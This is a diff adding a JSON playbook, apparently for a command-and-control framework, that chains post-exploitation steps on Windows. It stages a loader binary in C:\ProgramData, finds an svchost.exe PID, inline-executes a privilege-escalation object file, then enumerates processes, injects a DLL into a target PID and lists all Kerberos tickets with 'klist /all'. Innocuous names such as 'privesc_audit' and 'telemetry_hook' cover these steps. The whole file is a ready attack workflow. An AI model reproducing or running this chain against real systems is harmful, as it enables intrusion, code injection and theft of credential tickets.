@@ -1,0 +1,162 @@
+{
+    "low_priv": [
+        {
+            "id": "l_1",
+            "type": "custom",
+            "desc": "\ud83d\udcc1 upload stage1_loader.bin \u2192 C:\\ProgramData",
+            "cmd_index": 0,
+            "user_vals": {
+                "_local": "./modules/stage1_loader.bin",
+                "_remote": "C:\\ProgramData\\stage1_loader.bin"
+            },
+            "info": {
+                "CommandID": "15",
+                "SubCommand": "upload",
+                "Arguments": "<B64FILE:./modules/stage1_loader.bin:C:\\ProgramData\\stage1_loader.bin>"
+            },
+            "x": 50,
+            "y": 60,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        },
+        {
+            "id": "l_2",
+            "type": "custom",
+            "desc": "\u2699\ufe0f Process Search (svchost.exe)",
+            "cmd_index": 22,
+            "user_vals": {
+                "_search": "svchost.exe"
+            },
+            "info": {
+                "CommandID": "4112",
+                "ProcCommand": "3",
+                "Args": "svchost.exe"
+            },
+            "regexes": [
+                {
+                    "regex": "svchost\\.exe\\s+(\\d+)",
+                    "var_name": "svc_pid"
+                }
+            ],
+            "x": 50,
+            "y": 210,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        },
+        {
+            "id": "l_3",
+            "type": "custom",
+            "desc": "\ud83d\udc89 Inline-Execute privesc_audit.o (PID: {svc_pid})",
+            "cmd_index": 10,
+            "user_vals": {
+                "_file": "./modules/privesc_audit.o",
+                "FunctionName": "go",
+                "Arguments": "{svc_pid}",
+                "Flags": "threaded",
+                "HasCallback": "true"
+            },
+            "info": {
+                "CommandID": "20",
+                "FunctionName": "go",
+                "Binary": "<B64BIN:./modules/privesc_audit.o>",
+                "Arguments": "{svc_pid}",
+                "HasCallback": "true",
+                "Flags": "threaded"
+            },
+            "x": 50,
+            "y": 360,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        }
+    ],
+    "system": [
+        {
+            "id": "s_1",
+            "type": "custom",
+            "desc": "\ud83d\udc89 Inline-Execute proc_enum.o (BOF)",
+            "cmd_index": 10,
+            "user_vals": {
+                "_file": "./modules/proc_enum.o",
+                "FunctionName": "go",
+                "Arguments": "",
+                "Flags": "default",
+                "HasCallback": "true"
+            },
+            "info": {
+                "CommandID": "20",
+                "FunctionName": "go",
+                "Binary": "<B64BIN:./modules/proc_enum.o>",
+                "Arguments": "",
+                "HasCallback": "true",
+                "Flags": "default"
+            },
+            "regexes": [
+                {
+                    "regex": "TARGET_PID:(\\d+)",
+                    "var_name": "target_pid"
+                }
+            ],
+            "x": 430,
+            "y": 60,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        },
+        {
+            "id": "s_2",
+            "type": "custom",
+            "desc": "\ud83d\udc89 DLL Inject telemetry_hook.dll \u2192 {target_pid}",
+            "cmd_index": 11,
+            "user_vals": {
+                "PID": "{target_pid}",
+                "_file": "./modules/telemetry_hook.dll",
+                "Arguments": ""
+            },
+            "info": {
+                "CommandID": "22",
+                "PID": "{target_pid}",
+                "Binary": "<B64BIN:./modules/telemetry_hook.dll>",
+                "Arguments": ""
+            },
+            "x": 430,
+            "y": 210,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        },
+        {
+            "id": "s_3",
+            "type": "custom",
+            "desc": "\ud83d\udd10 Kerberos KList (/all) & Telemetry Collection",
+            "cmd_index": 64,
+            "user_vals": {},
+            "info": {
+                "CommandID": "2550",
+                "Command": "klist",
+                "Argument1": "/all"
+            },
+            "x": 430,
+            "y": 360,
+            "width": 270,
+            "height": 75,
+            "font_size": 10
+        }
+    ],
+    "dependencies": [
+        {
+            "source_id": "l_2",
+            "source_step": "\u2699\ufe0f Process Search (svchost.exe)",
+            "regex": "svchost\\.exe\\s+(\\d+)",
+            "var_name": "svc_pid"
+        },
+        {
+            "source_id": "s_1",
+            "source_step": "\ud83d\udc89 Inline-Execute proc_enum.o (BOF)",
+            "regex": "TARGET_PID:(\\d+)",
+            "var_name": "target_pid"
+        }
+    ]
+}
